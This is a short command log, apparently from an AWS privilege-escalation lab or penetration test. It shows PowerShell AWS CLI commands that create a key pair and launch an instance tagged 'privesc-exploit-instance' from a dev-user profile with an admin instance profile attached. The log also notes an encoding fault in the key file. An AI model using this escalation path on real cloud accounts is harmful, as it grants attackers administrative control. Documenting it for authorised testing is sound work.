--- Key pair (attempt 1: failed due to Windows text encoding) ---

PS C:\Users\USER> aws ec2 create-key-pair --key-name bincom-privesc-key --query "KeyMaterial" --output text --profile bincom-admin > bincom-privesc-key.pem

Note: PowerShell's ">" redirect writes UTF-16LE with a byte order mark by
default, which corrupts a plain text SSH private key. This caused an
"invalid format" error at the SSH step below and had to be corrected.

--- Instance launch (attempt 1: wrong instance type) ---

PS C:\Users\USER> aws ec2 describe-images --owners amazon --filters "Name=name,Values=al2023-ami-*-x86_64" "Name=state,Values=available" --query "sort_by(Images, &CreationDate)[-1].ImageId" --output text --profile bincom-admin
ami-0bdbbea3e76315b75

PS C:\Users\USER> aws ec2 run-instances --image-id ami-0bdbbea3e76315b75 --instance-type t2.micro --key-name bincom-privesc-key --security-group-ids sg-07dd6d0efee71dcaf --subnet-id subnet-014b46080b850a527 --iam-instance-profile Name=EC2-Admin-Instance-Profile --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=privesc-exploit-instance}]" --profile bincom-dev-user

